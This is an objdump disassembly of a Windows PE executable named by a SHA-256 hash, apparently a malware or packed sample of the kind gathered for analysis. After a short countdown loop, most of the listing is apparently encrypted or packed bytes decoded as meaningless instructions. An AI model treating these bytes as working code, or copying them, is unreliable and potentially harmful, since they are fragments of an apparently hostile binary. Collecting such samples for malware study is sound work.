
ce18836234f346e1f917d94dd00601a76947631556141c6b70c2ae4a98e078c9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x426ae2
  40100e:	mov    DWORD PTR ds:0x42a37d,0x1b
  401018:	cmp    DWORD PTR ds:0x42a37d,0x0
  40101f:	je     0x40155e
  401025:	cmp    DWORD PTR ds:0x42a37d,0x23
  40102c:	jne    0x40103b
  401032:	push   DWORD PTR [ebp-0x14]
  401035:	call   DWORD PTR ds:0x42501c
  40103b:	mov    ecx,DWORD PTR ds:0x42a37d
  401041:	dec    ecx
  401042:	mov    DWORD PTR ds:0x42a37d,ecx
  401048:	jmp    0x401018
  40104d:	or     DWORD PTR ds:0x42a405,ebx
  401053:	jmp    0x40155e
  401058:	int    0x3c
  40105a:	sar    DWORD PTR ds:0xccd1cdd1,1
  401060:	(bad)  
  401061:	push   eax
  401063:	sbb    al,0x5a
  401065:	sbb    DWORD PTR [ebx-0xf],edi
  401068:	js     0x4010e2
  40106a:	js     0x4010e4
  40106c:	push   0x7c
  40106e:	js     0x4010e8
  401070:	enter  0x3dd7,0xd5
  401074:	rcr    ebx,0xcf
  401077:	fld    st(6)
  401079:	pop    es
  40107a:	push   es
  40107b:	or     ecx,DWORD PTR [ebx]
  40107d:	ror    BYTE PTR [edx],0xf
  401080:	cmp    ecx,DWORD PTR [edi]
  401082:	retf   0xc722
  401085:	sbb    bl,BYTE PTR [edi]
  401087:	inc    ecx
  401088:	bound  ecx,QWORD PTR [edx]
  40108a:	mov    bh,0xdd
  40108c:	or     bh,ch
  40108e:	mov    ebp,0x880bd0e3
  401093:	and    BYTE PTR [eax+0x1549a4f6],bh
  401099:	lods   eax,DWORD PTR ds:[esi]
  40109a:	fadd   DWORD PTR [eax+0x1f]
  40109d:	pusha  
  40109e:	out    dx,al
  40109f:	outs   dx,DWORD PTR ds:[esi]
  4010a0:	adc    ebx,DWORD PTR [ecx]
  4010a2:	sahf   
  4010a3:	add    dl,al
  4010a5:	dec    edx
  4010a6:	lods   al,BYTE PTR ds:[esi]
  4010a7:	pop    ebx
  4010a8:	sub    eax,0xad3ec6d9
  4010ad:	mov    WORD PTR [ebx],es
  4010af:	lds    esi,FWORD PTR [ebx-0x76243a00]
  4010b5:	adc    eax,0x3af3c19a
  4010bb:	xchg   ebx,eax
  4010bc:	icebp  
  4010bd:	dec    edi
  4010be:	loopne 0x401060
  4010c0:	dec    ecx
  4010c1:	call   DWORD PTR [edi-0x234ef85e]
  4010c7:	mov    ebp,0x5530ed4d
  4010cc:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  4010d3:	sbb    ebx,ecx
  4010d5:	xchg   esp,eax
  4010d6:	sub    esi,edx
  4010d8:	repz pop eax
  4010da:	(bad)  
  4010db:	out    0x42,al
  4010dd:	cli    
  4010de:	in     al,dx
  4010df:	xchg   esp,eax
  4010e0:	cmp    edi,ecx
  4010e2:	jbe    0x401149
  4010e4:	xlat   BYTE PTR ds:[ebx]
  4010e5:	sub    cl,ch
  4010e7:	add    al,0xe1
  4010e9:	sbb    DWORD PTR [ecx-0x60],ebx
  4010ec:	xor    eax,0x2696f0b
  4010f1:	adc    bh,BYTE PTR [ecx]
  4010f3:	fisttp QWORD PTR [eax+0x7f753256]
  4010f9:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010ff:	arpl   WORD PTR [ebp-0x23],dx
  401102:	rcl    BYTE PTR [ecx],1
  401104:	fistp  DWORD PTR [esi-0x1f]
  401107:	and    DWORD PTR [ecx-0x68],edi
  40110a:	inc    eax
  40110b:	push   ebx
  40110c:	aaa    
  40110d:	adc    eax,0x1c317733
  401112:	fstp   TBYTE PTR [eax]
  401114:	dec    edi
  401115:	repnz into 
  401117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401118:	daa    
  401119:	mov    ds:0x9573f10,eax
  40111e:	imul   eax,DWORD PTR [edi+0x767779da],0x5a
  401125:	add    eax,0x22b102a
  40112a:	fs mov esp,0xaeaa686e
  401130:	ja     0x4010bd
  401132:	rcr    BYTE PTR [eax],cl
  401134:	xor    edi,DWORD PTR [ebx+0x22100605]
  40113a:	nop
  40113b:	xchg   ebx,eax
  40113c:	mov    bl,0x85
  40113e:	push   esp
  40113f:	and    edi,DWORD PTR [edi]
  401141:	loopne 0x40113e
  401143:	push   edi
  401144:	mov    ebp,0x9b9a86d6
  401149:	pop    ss
  40114a:	int    0x71
  40114c:	mov    edi,0x2762c816
  401151:	rcr    BYTE PTR [ecx+0x6208581],0xa8
  401158:	adc    al,0xa5
  40115a:	cld    
  40115b:	mov    edi,0x37fec22b
  401160:	call   0xe701b0ab
  401165:	stos   DWORD PTR es:[edi],eax
  401166:	mov    bl,0xa0
  401168:	or     al,0xb8
  40116a:	fimul  DWORD PTR [ecx]
  40116c:	pop    ebx
  40116d:	fst    DWORD PTR ds:0x7c79bd38
  401173:	jns    0x40117b
  401175:	push   ebx
  401176:	jmp    0x28ea:0x4c4f85c9
  40117d:	xchg   edx,eax
  40117e:	aas    
  40117f:	loope  0x4011d3
  401181:	cmp    edi,edi
  401183:	out    dx,al
  401184:	out    dx,eax
  401185:	popa   
  401186:	pusha  
  401187:	int3   
  401188:	or     DWORD PTR [edx],0x66bebb8c
  40118e:	rcr    BYTE PTR [edi],0x1f
  401191:	and    eax,0x258b2b6
  401196:	fistp  DWORD PTR [ebp-0x68ab0441]
  40119d:	std    
  40119e:	imul   ebx,ecx,0x46fba9f
  4011a4:	and    esi,DWORD PTR [eax+ebp*4-0x15]
  4011a8:	stos   DWORD PTR es:[edi],eax
  4011a9:	jecxz  0x4011c8
  4011ab:	cmp    al,0xd3
  4011ad:	add    eax,0xb23ca620
  4011b2:	and    BYTE PTR [ebp-0x56],al
  4011b5:	test   eax,0xa4a89af6
  4011ba:	push   edx
  4011bb:	into   
  4011bc:	popf   
  4011bd:	imul   edi,DWORD PTR [eax],0xffffffba
  4011c0:	adc    ebp,DWORD PTR [edx-0x5a]
  4011c3:	ja     0x40118e
  4011c5:	jo     0x4011a0
  4011c7:	cmc    
  4011c8:	sahf   
  4011c9:	jb     0x4011b6
  4011cb:	ret    
  4011cc:	inc    ebx
  4011cd:	imul   edi,ebx,0xffffffaa
  4011d0:	and    dh,BYTE PTR [ecx]
  4011d2:	sub    eax,0x305feb93
  4011d7:	bound  ecx,QWORD PTR [ecx+0x60ebac1b]
  4011dd:	mov    dl,0x7a
  4011df:	mov    BYTE PTR [esi+0x1aa200ca],dh
  4011e5:	push   0xffffffca
  4011e7:	or     ecx,esp
  4011e9:	push   edi
  4011ea:	pop    ecx
  4011eb:	js     0x40123f
  4011ed:	inc    edi
  4011ee:	outs   dx,DWORD PTR ds:[esi]
  4011ef:	les    ebx,FWORD PTR [eax]
  4011f1:	les    ecx,FWORD PTR [edx-0x3fdd53b9]
  4011f7:	or     DWORD PTR [ebp-0x61],0xee18f3d3
  4011fe:	pop    edx
  4011ff:	mov    DWORD PTR [ecx+0x6e],edx
  401202:	stc    
  401203:	addr16 mov dh,0x1c
  401206:	push   ss
  401207:	push   edi
  401208:	jmp    0xa200f46b
  40120d:	pushf  
  40120e:	cdq    
  40120f:	pop    eax
  401210:	clc    
  401211:	push   ds
  401212:	push   edi
  401213:	fsubr  st,st(5)
  401215:	bound  esp,QWORD PTR [ebx]
  401217:	fld    TBYTE PTR [ecx+0x26]
  40121a:	std    
  40121b:	in     al,dx
  40121c:	pop    ss
  40121d:	jl     0x401215
  40121f:	call   0x209f2040
  401224:	adc    al,0x69
  401226:	inc    edx
  401227:	pop    edx
  401228:	fistp  DWORD PTR [ebx+0x378c06bd]
  40122e:	cmp    al,0xaf
  401230:	and    esp,DWORD PTR [ebx+0x78]
  401233:	pusha  
  401234:	xchg   ebp,eax
  401235:	or     BYTE PTR [edx+0x22a0c82b],0xe9
  40123c:	xor    BYTE PTR [edx],ch
  40123e:	pop    ds
  40123f:	dec    eax
  401240:	inc    ecx
  401241:	js     0x401210
  401243:	lock xlat BYTE PTR ds:[ebx]
  401245:	mov    esp,0xf94ce40f
  40124a:	gs int 0x7
  40124d:	cs in  eax,dx
  40124f:	mov    al,0x4e
  401251:	jbe    0x401235
  401253:	js     0x4012d1
  401255:	jnp    0x40129f
  401257:	mov    eax,0x3785b176
  40125c:	xchg   edx,eax
  40125d:	dec    ecx
  40125e:	out    0x57,al
  401260:	sub    al,0x47
  401262:	mov    ah,0xd0
  401264:	ins    BYTE PTR es:[edi],dx
  401265:	jae    0x40125c
  401267:	into   
  401268:	rol    BYTE PTR [eax],0xad
  40126b:	or     BYTE PTR [ecx-0x67],ah
  40126e:	loope  0x401296
  401270:	sub    dh,BYTE PTR [ebp+0x72c2e784]
  401276:	mov    DWORD PTR [edi+0x7adf85ff],ebp
  40127c:	in     al,dx
  40127d:	shr    DWORD PTR [ebp+0x1d4b3077],1
  401283:	out    dx,al
  401284:	loopne 0x4012a9
  401286:	aas    
  401287:	and    bl,0xba
  40128a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40128b:	sbb    dl,bh
  40128d:	push   ebx
  40128e:	loope  0x40130c
  401290:	jecxz  0x4012d2
  401292:	sub    DWORD PTR [esi-0x3e],0xd6495fdf
  401299:	pop    ds
  40129a:	popf   
  40129b:	or     al,0xaf
  40129d:	mov    ds:0x6ed282bd,eax
  4012a2:	add    eax,0x97614500
  4012a7:	hlt    
  4012a8:	jo     0x401256
  4012aa:	push   cs
  4012ab:	push   ebx
  4012ac:	leave  
  4012ad:	popf   
  4012ae:	lds    ecx,FWORD PTR [edx+0x10e27763]
  4012b4:	mov    ds:0x472ae07,al
  4012b9:	pop    esp
  4012ba:	pop    ds
  4012bb:	in     al,0x62
  4012bd:	inc    esi
  4012be:	repz out 0x7b,eax
  4012c1:	fcom   st(1)
  4012c3:	mov    ch,0x40
  4012c5:	leave  
  4012c6:	jno    0x40128f
  4012c8:	dec    ebx
  4012c9:	push   ecx
  4012ca:	and    bh,BYTE PTR [ebp+0x5ef26f54]
  4012d0:	and    edi,DWORD PTR [ebx+0x41]
  4012d3:	jp     0x401331
  4012d5:	lock sub al,0x64
  4012d8:	ins    DWORD PTR es:[edi],dx
  4012d9:	mov    DWORD PTR ds:0x9acbbfc1,ebp
  4012df:	in     al,dx
  4012e0:	arpl   WORD PTR [edi],ax
  4012e2:	stos   BYTE PTR es:[edi],al
  4012e3:	lock aad 0x90
  4012e6:	nop
  4012e7:	jmp    0x1525:0x4f82c41f
  4012ee:	add    bh,ah
  4012f0:	inc    BYTE PTR [ecx]
  4012f2:	bound  esi,QWORD PTR [ebx-0x17cacaa]
  4012f8:	add    DWORD PTR [edi+ebx*4],esp
  4012fb:	sbb    al,0x35
  4012fd:	ficom  WORD PTR [esi-0x7dba65f0]
  401303:	push   0xc104d975
  401308:	mov    al,ds:0x9b9e04c
  40130d:	mov    dh,0xcc
  40130f:	stc    
  401310:	loope  0x40136b
  401312:	and    ch,bh
  401314:	pushf  
  401315:	push   ecx
  401316:	mov    DWORD PTR [ebx-0x68ac2bda],eax
  40131c:	pusha  
  40131d:	xchg   ebp,eax
  40131e:	popa   
  40131f:	sub    BYTE PTR [edx+0x4f],bl
  401322:	lahf   
  401323:	xchg   ecx,eax
  401324:	out    dx,al
  401325:	jl     0x28ed80c4
  40132b:	int    0x14
  40132d:	adc    al,0xb5
  40132f:	jae    0x40132a
  401331:	call   0x9812c5df
  401336:	repz imul esp,DWORD PTR [edi-0x6cd54655],0xff17d453
  401341:	xor    BYTE PTR [eax+0x12051ce3],0xf1
  401348:	retf   0xc2f6
  40134b:	neg    BYTE PTR [ebp+ebx*4+0x71]
  40134f:	out    dx,eax
  401350:	pop    ebp
  401351:	sti    
  401352:	jl     0x401386
  401354:	and    eax,0x838eaea
  401359:	sbb    dl,BYTE PTR [esi-0x374a2651]
  40135f:	mov    edi,DWORD PTR [edx-0x2d8ff236]
  401365:	scas   al,BYTE PTR es:[edi]
  401366:	fst    QWORD PTR [eax]
  401368:	jp     0x40135a
  40136a:	sbb    DWORD PTR [edx+0x49],edx
  40136d:	mov    ch,BYTE PTR [esi-0x71]
  401370:	mov    esi,0xbe7b4aaf
  401375:	sar    BYTE PTR [edx-0x48],1
  401378:	(bad)  
  401379:	repnz push es
  40137b:	ins    DWORD PTR es:[edi],dx
  40137c:	dec    bp
  40137e:	test   DWORD PTR [eax-0x13],edx
  401381:	out    0xa0,eax
  401383:	ins    BYTE PTR es:[edi],dx
  401384:	mov    gs,WORD PTR [edx]
  401386:	mov    bl,0xbb
  401388:	and    DWORD PTR [edi-0x5f],eax
  40138b:	in     al,0xe1
  40138d:	mov    dl,0xf
  40138f:	push   edx
  401390:	js     0x40136c
  401392:	dec    eax
  401393:	outs   dx,DWORD PTR ds:[esi]
  401394:	or     BYTE PTR ds:[edi+0x3742367a],dh
  40139b:	cmp    DWORD PTR [ebx+ebp*2-0x175dbd47],eax
  4013a2:	cmp    DWORD PTR [edi],edx
  4013a4:	dec    eax
  4013a5:	jno    0x401341
  4013a7:	adc    BYTE PTR [esi+0x5f],ch
  4013aa:	call   0xfcd7:0x13feca88
  4013b1:	bound  edi,QWORD PTR [ebx-0x4d]
  4013b4:	xchg   ebx,eax
  4013b5:	pop    edi
  4013b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013b7:	pop    ecx
  4013b8:	jne    0x401406
  4013ba:	mov    esp,0x565ff3ac
  4013bf:	or     DWORD PTR [edi+0x58],esp
  4013c2:	pop    es
  4013c3:	cwde   
  4013c4:	out    dx,al
  4013c5:	adc    al,0x67
  4013c7:	inc    ebx
  4013c8:	pop    ss
  4013c9:	retf   
  4013ca:	loopne 0x40136b
  4013cc:	loope  0x401375
  4013ce:	(bad)  
  4013cf:	mov    edi,0x8c85cb5a
  4013d4:	ins    DWORD PTR es:[edi],dx
  4013d5:	test   al,0xba
  4013d7:	sbb    DWORD PTR [ecx+0x63],eax
  4013da:	pushf  
  4013db:	sub    al,0xb9
  4013dd:	stos   BYTE PTR es:[edi],al
  4013de:	xchg   ecx,eax
  4013df:	add    DWORD PTR [ecx+0x31],ecx
  4013e2:	pop    cx
  4013e4:	mov    eax,0x580dbdd5
  4013e9:	cli    
  4013ea:	sub    eax,ebp
  4013ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013ed:	(bad)  
  4013ee:	lock int3 
  4013f0:	push   edx
  4013f1:	fcom   DWORD PTR ds:0x9127c150
  4013f7:	iret   
  4013f8:	idiv   BYTE PTR [eax]
  4013fa:	jmp    0x35207b94
  4013ff:	fst    QWORD PTR [ebx-0x2a451618]
  401405:	shl    DWORD PTR gs:[ebx+0x11],cl
  401409:	fbstp  TBYTE PTR [esi]
  40140b:	mov    cl,BYTE PTR [edi-0x6702b30b]
  401411:	ds jle 0x401404
  401414:	loop   0x4013e6
  401416:	jg     0x40142a
  401418:	jmp    DWORD PTR [edi+0x34ca76a3]
  40141e:	cli    
  40141f:	das    
  401420:	sbb    ecx,DWORD PTR [ebx+0x30c3dc36]
  401426:	xchg   ebp,eax
  401427:	test   DWORD PTR [ebx+edx*2+0x415081ad],esi
  40142e:	mov    ebp,esp
  401430:	leave  
  401431:	xchg   esi,eax
  401432:	pop    ecx
  401433:	cmp    al,0xdd
  401435:	lea    esi,[edi]
  401437:	sahf   
  401438:	in     eax,0x57
  40143a:	je     0x4013e1
  40143c:	add    esp,edx
  40143e:	pop    ds
  40143f:	dec    ecx
  401440:	push   esi
  401441:	call   0x6970dc14
  401446:	mov    WORD PTR [ecx+0x4e],?
  401449:	shl    BYTE PTR [edi],0x3b
  40144c:	ds scas al,BYTE PTR es:[edi]
  40144e:	ss ins BYTE PTR es:[edi],dx
  401450:	jp     0x401472
  401452:	(bad)  
  401453:	cli    
  401454:	mov    WORD PTR [edi-0x7b0ddcf],cs
  40145a:	es mov dl,0x75
  40145d:	leave  
  40145e:	push   ds
  40145f:	jp     0x401454
  401461:	sbb    edx,DWORD PTR [ebx]
  401463:	or     bh,dh
  401465:	rcr    BYTE PTR [edi],0x2f
  401468:	rcr    BYTE PTR [esi],0x52
  40146b:	xor    BYTE PTR [esp+ebp*2-0x25d91ac6],ch
  401472:	push   eax
  401473:	repnz inc ebx
  401475:	test   BYTE PTR [eax+ebx*1+0x31da33dd],dh
  40147c:	ins    BYTE PTR es:[edi],dx
  40147d:	lock xchg edx,eax
  40147f:	fcom   st(4)
  401481:	mov    bl,dh
  401483:	leave  
  401484:	inc    ebx
  401485:	js     0x40145d
  401487:	xchg   esp,eax
  401488:	mov    bh,0xaf
  40148a:	pop    ecx
  40148b:	pop    esi
  40148c:	icebp  
  40148d:	and    ecx,esp
  40148f:	xlat   BYTE PTR ds:[ebx]
  401490:	push   ebp
  401491:	cmp    bl,dl
  401493:	fisubr WORD PTR [esi]
  401495:	push   ecx
  401496:	cmp    al,0x97
  401498:	xchg   bh,ch
  40149a:	jmp    0xa8f471a2
  40149f:	add    BYTE PTR [esi],bl
  4014a1:	cmp    BYTE PTR [edx+eiz*8+0x5f],bl
  4014a5:	mov    ah,ah
  4014a7:	cmp    BYTE PTR [esi],bl
  4014a9:	xor    ch,BYTE PTR [ebx]
  4014ab:	dec    esp
  4014ac:	into   
  4014ad:	pusha  
  4014ae:	call   DWORD PTR [eax+0x73]
  4014b1:	mov    al,ds:0x1f3c30d6
  4014b6:	mov    esp,0x4765549e
  4014bb:	dec    ebx
  4014bc:	data16 shr ch,cl
  4014bf:	fs pop esi
  4014c1:	mov    esp,es
  4014c3:	inc    ebx
  4014c4:	stc    
  4014c5:	and    dh,BYTE PTR [eax-0x53]
  4014c8:	retf   0x1098
  4014cb:	popf   
  4014cc:	or     dh,0xea
  4014cf:	adc    eax,0x63298c1a
  4014d4:	mov    ah,0x64
  4014d6:	jo     0x4014f3
  4014d8:	(bad)  
  4014da:	inc    edi
  4014db:	push   ss
  4014dc:	je     0x401503
  4014de:	and    eax,0x5caaa931
  4014e3:	sbb    BYTE PTR [edx],bh
  4014e5:	adc    ch,dl
  4014e7:	in     al,0xdb
  4014e9:	add    eax,0x8cc804e6
  4014ee:	pop    ds
  4014ef:	fild   WORD PTR [ebp-0x65cd4d53]
  4014f5:	mov    eax,0xfebea9b5
  4014fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014fb:	cmp    eax,0xbf0aa086
  401500:	adc    al,0x91
  401502:	lock xchg ebx,eax
  401504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401505:	pop    esi
  401506:	jge    0x4014c3
  401508:	adc    ah,BYTE PTR [eax+0xa1cd9ec]
  40150e:	outs   dx,BYTE PTR ds:[esi]
  40150f:	sti    
  401510:	ret    
  401511:	mov    edx,0xb5f27efb
  401516:	mov    bl,0x43
  401518:	mov    cs,WORD PTR [esi-0x60ad58b4]
  40151e:	or     eax,0xa234bd65
  401523:	dec    eax
  401524:	aas    
  401525:	mov    esi,0x66b706d4
  40152a:	sub    dh,BYTE PTR [ebp+0x4328c065]
  401530:	rcr    DWORD PTR [eax+0x73],1
  401533:	je     0x40153b
  401535:	fild   WORD PTR [edi+0x2a]
  401538:	retf   0xc9c8
  40153b:	sbb    bh,ah
  40153d:	arpl   WORD PTR [edx],sp
  40153f:	and    dh,BYTE PTR [edi-0x148782a4]
  401545:	jp     0x401528
  401547:	frstor [esi+0x763879f7]
  40154d:	add    eax,0x3490dc5f
  401552:	loopne 0x40159c
  401554:	mov    DWORD PTR ds:0x6195a74b,esp
  40155a:	lahf   
  40155b:	fmul   QWORD PTR [esp+eax*4-0x77]
  40155f:	inc    ebp
  401560:	call   0x42ac0806
  401565:	add    BYTE PTR [ecx+0x1519b845],cl
  40156b:	or     eax,0xc70042a4
  401570:	inc    ebp
  401571:	lock cmp BYTE PTR [ebp+0x45c7f89c],al
  401578:	in     al,0x39
  40157a:	test   DWORD PTR [eax+edi*8-0x5c4ef275],ebx
  401581:	inc    edx
  401582:	add    BYTE PTR [ecx],dh
  401584:	or     eax,0x42a3bd
  401589:	mov    eax,DWORD PTR [ebp-0x10]
  40158c:	and    DWORD PTR ds:0x42a2e1,0x692a
  401596:	push   ebx
  401597:	sub    ecx,ecx
  401599:	jmp    0x401aa4
  40159e:	enter  0xc8d0,0xd7
  4015a2:	rcl    bh,1
  4015a4:	xlat   BYTE PTR ds:[ebx]
  4015a5:	xlat   BYTE PTR ds:[ebx]
  4015a6:	dec    ebx
  4015a7:	xor    BYTE PTR [edi],bl
  4015a9:	pop    esi
  4015aa:	ja     0x401616
  4015ac:	xor    al,0x35
  4015ae:	push   0x7c
  4015b0:	js     0x40162a
  4015b2:	push   0x7c
  4015b4:	js     0x40162e
  4015b6:	push   0xffffffeb
  4015b8:	cdq    
  4015b9:	xor    DWORD PTR [edi-0x1d],eax
  4015bc:	ret    
  4015bd:	push   ss
  4015be:	das    
  4015bf:	retf   
  4015c0:	ret    0xa854
  4015c3:	es scas eax,DWORD PTR es:[edi]
  4015c5:	mov    DWORD PTR [edx*2-0x7df4f42b],esp
  4015cc:	sbb    cl,BYTE PTR [esi+0x4a]
  4015cf:	add    al,0x9e
  4015d1:	jp     0x401622
  4015d3:	xchg   edi,eax
  4015d4:	fsubr  QWORD PTR [ecx-0x1189a462]
  4015da:	cs test al,0xe2
  4015dd:	add    eax,0x7297f92
  4015e2:	inc    eax
  4015e3:	push   eax
  4015e4:	in     al,dx
  4015e5:	cli    
  4015e6:	jae    0x40164a
  4015e8:	mov    dl,0x58
  4015ea:	enter  0xaf3f,0x1a
  4015ee:	jb     0x401647
  4015f0:	fwait
  4015f1:	jns    0x40157f
  4015f3:	sub    DWORD PTR [ebx-0x656d4537],esp
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	mov    DWORD PTR [edx-0x1a6e5212],edx
  401600:	adc    DWORD PTR [ebp-0x37d54f0a],edx
  401606:	in     eax,dx
  401607:	xor    DWORD PTR [ebp-0x42],ecx
  40160a:	dec    esp
  40160b:	xchg   esi,eax
  40160c:	and    eax,0x42128561
  401611:	mov    ds:0x98782bce,al
  401616:	addr16 mov ch,0x9f
  401619:	push   esp
  40161a:	jae    0x401613
  40161c:	inc    esi
  40161d:	ins    DWORD PTR es:[edi],dx
  40161e:	pop    es
  40161f:	dec    ebp
  401620:	cld    
  401621:	rcr    DWORD PTR [eax+eax*1-0x182920be],cl
  401628:	sub    al,0xbe
  40162a:	xchg   edi,eax
  40162b:	repnz pop esp
  40162d:	enter  0xa3ec,0x1f
  401631:	jmp    0x17a9f9e5
  401636:	aad    0xfc
  401638:	ja     0x4016b4
  40163a:	xchg   ebx,eax
  40163b:	ror    esp,0xc4
  40163e:	nop
  40163f:	sti    
  401640:	shl    ah,1
  401642:	pop    ebx
  401643:	ret    
  401644:	aaa    
  401645:	xchg   esi,eax
  401646:	jecxz  0x401629
  401648:	inc    eax
  401649:	push   0xffffffb2
  40164b:	shl    BYTE PTR [edx+0x3f],cl
  40164e:	add    ah,BYTE PTR [edi+eax*2]
  401651:	sub    BYTE PTR [eax-0x40],ah
  401654:	call   0xc25730ed
  401659:	ins    BYTE PTR es:[edi],dx
  40165a:	addr16 icebp 
  40165c:	push   ebx
  40165d:	data16 repz repnz sti 
  401661:	stc    
  401662:	or     bl,ah
  401664:	push   esp
  401665:	enter  0xb0e2,0xca
  401669:	xor    DWORD PTR ds:0x6e6bfb56,eax
  40166f:	iret   
  401670:	mov    dl,0xef
  401672:	cmp    al,0x86
  401674:	dec    ecx
  401675:	aas    
  401676:	mov    ch,0x89
  401678:	xchg   edi,eax
  401679:	inc    edi
  40167a:	ss popa 
  40167c:	retf   0x7b08
  40167f:	test   eax,0x1a56aa85
  401684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401685:	and    al,BYTE PTR [ebp+0x16]
  401688:	sub    al,al
  40168a:	jns    0x401689
  40168c:	pop    ds
  40168d:	cli    
  40168e:	xchg   DWORD PTR [edi],esi
  401690:	mov    al,0xbd
  401692:	add    esp,ecx
  401694:	retf   0xa565
  401697:	lods   eax,DWORD PTR ds:[esi]
  401698:	xor    dh,bl
  40169a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40169b:	jmp    0x6700:0xefedeeb2
  4016a2:	das    
  4016a3:	mov    ebx,DWORD PTR [ecx-0x4b]
  4016a6:	mov    cl,0xba
  4016a8:	add    al,BYTE PTR [edi-0x33106ad3]
  4016ae:	adc    eax,0xf1852dd5
  4016b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016b4:	cmc    
  4016b5:	(bad)  
  4016b6:	mov    al,ds:0x277b14b9
  4016bb:	xchg   esp,eax
  4016bc:	jmp    0x401690
  4016be:	(bad)  
  4016bf:	shl    BYTE PTR [ebp+0x19],cl
  4016c2:	ror    BYTE PTR [esi+esi*8-0x7b0e9de5],0x51
  4016ca:	jecxz  0x401686
  4016cc:	inc    ebp
  4016cd:	mov    DWORD PTR [ebx+0x68],ebp
  4016d0:	int    0xaa
  4016d2:	lahf   
  4016d3:	fld    DWORD PTR ss:[ebx+0x262da3be]
  4016da:	pop    ebx
  4016db:	imul   edi,DWORD PTR [esp+eax*4],0x38
  4016df:	adc    esi,DWORD PTR [esi+0x6b368264]
  4016e5:	retf   
  4016e6:	outs   dx,DWORD PTR ds:[esi]
  4016e7:	dec    ecx
  4016e8:	push   eax
  4016e9:	dec    edx
  4016ea:	push   0x1c750466
  4016ef:	mov    ebp,0xc5e03489
  4016f4:	sub    BYTE PTR [ecx],cl
  4016f6:	sub    eax,0xd6d1bfd2
  4016fb:	leave  
  4016fc:	and    ah,bh
  4016fe:	test   eax,0xfadeae3e
  401703:	xor    dh,BYTE PTR [esi-0x14]
  401706:	inc    edi
  401707:	mov    esi,0x952e4e9b
  40170c:	sbb    al,BYTE PTR [ecx+esi*1+0x5]
  401710:	clc    
  401711:	dec    esp
  401712:	adc    eax,0x499a0c9b
  401717:	mov    ah,al
  401719:	xor    eax,0x1d4933ca
  40171e:	sbb    edi,esi
  401720:	test   DWORD PTR [esi+eiz*8-0x6a],esi
  401724:	out    dx,eax
  401725:	hlt    
  401726:	or     eax,0x65c6ab10
  40172b:	dec    ebx
  40172c:	popf   
  40172d:	inc    edi
  40172e:	inc    edi
  40172f:	jg     0x401784
  401731:	scas   al,BYTE PTR es:[edi]
  401732:	shr    DWORD PTR [ebp+ecx*8-0x33],cl
  401736:	inc    ebp
  401737:	jle    0x401731
  401739:	and    cl,ah
  40173b:	outs   dx,BYTE PTR ds:[esi]
  40173c:	mov    eax,ebx
  40173e:	xor    ch,BYTE PTR [ecx]
  401740:	dec    ebp
  401741:	xchg   ebp,eax
  401742:	cmp    eax,ebp
  401744:	retf   0x493b
  401747:	scas   al,BYTE PTR es:[edi]
  401748:	repz addr16 mov cl,0x14
  40174c:	mov    ch,0x75
  40174e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40174f:	retf   
  401750:	pop    ecx
  401751:	sbb    eax,0x58edf0b8
  401756:	iret   
  401757:	xchg   ecx,eax
  401758:	arpl   di,ax
  40175a:	or     DWORD PTR [eax],edx
  40175c:	xchg   BYTE PTR [edi],ch
  40175e:	push   edx
  40175f:	pushf  
  401760:	dec    eax
  401761:	leave  
  401762:	imul   eax,DWORD PTR [edi+0x3c],0x67c082e6
  401769:	test   BYTE PTR [ecx],ah
  40176b:	cmp    DWORD PTR [ebx+0x1],edi
  40176e:	das    
  40176f:	ss sahf 
  401771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401772:	lods   eax,DWORD PTR ds:[esi]
  401773:	sub    DWORD PTR [ecx+ecx*4-0x17],ebp
  401777:	rcl    DWORD PTR [esi],cl
  401779:	mov    eax,ds:0x173a8bd
  40177e:	and    BYTE PTR [ebx-0x14],al
  401781:	(bad)  
  401783:	ret    0xd5ea
  401786:	retfw  
  401788:	(bad)  
  401789:	mov    esp,DWORD PTR [esi+0x1f]
  40178c:	dec    ebx
  40178d:	jp     0x401786
  40178f:	and    ebx,DWORD PTR [esi]
  401791:	mov    al,0x11
  401793:	jno    0x401795
  401795:	mov    edx,DWORD PTR [edi+0x30]
  401798:	out    0x88,eax
  40179a:	jnp    0x4017d1
  40179c:	mov    edx,0xe0e1b9fb
  4017a1:	out    0x48,eax
  4017a3:	(bad)  
  4017a4:	xor    BYTE PTR [ebx],0x8
  4017a7:	push   0x12
  4017a9:	test   al,0x2b
  4017ab:	fnstcw WORD PTR [edi+edi*1]
  4017ae:	dec    ebx
  4017af:	pop    ss
  4017b0:	cs xchg ebp,eax
  4017b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017b3:	push   esi
  4017b4:	adc    al,0xb5
  4017b6:	test   al,0xcb
  4017b9:	cmp    eax,0xec4e73df
  4017be:	out    dx,eax
  4017bf:	fild   DWORD PTR [esi-0x212b925]
  4017c5:	icebp  
  4017c6:	lea    edx,[ebp-0x7e]
  4017c9:	push   ebx
  4017ca:	push   esp
  4017cb:	push   ebx
  4017cc:	lahf   
  4017cd:	fwait
  4017ce:	xor    BYTE PTR [edi+0x476b4ed1],ch
  4017d4:	or     bl,ch
  4017d6:	mov    ecx,0x6d2f9cc6
  4017db:	inc    esi
  4017dc:	cmc    
  4017dd:	jle    0x401792
  4017df:	add    edi,DWORD PTR [edx+0x5d]
  4017e2:	pop    edx
  4017e3:	add    edx,DWORD PTR [esi+0x2f528bdf]
  4017e9:	icebp  
  4017ea:	scas   al,BYTE PTR es:[edi]
  4017eb:	adc    edx,edi
  4017ed:	sub    BYTE PTR [eax-0x72],0x24
  4017f1:	test   DWORD PTR [eax],edx
